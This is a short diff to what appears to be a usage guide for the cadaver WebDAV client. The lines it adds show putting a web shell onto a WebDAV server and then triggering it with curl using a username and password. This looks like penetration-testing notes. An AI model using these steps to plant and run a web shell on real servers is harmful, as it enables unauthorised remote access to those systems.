@@ -7,6 +7,10 @@ Think of it like FTP, but for WebDAV, which is a protocol for managing files ove
 Basic Usage
 cadaver https://your.webdav.server/
 
+put /path/for/your/webshell
+
+curl -u "user:pass" {URL/webdav/shell}
+
 
 Then you'll get an interactive prompt (like FTP), where you can:
 
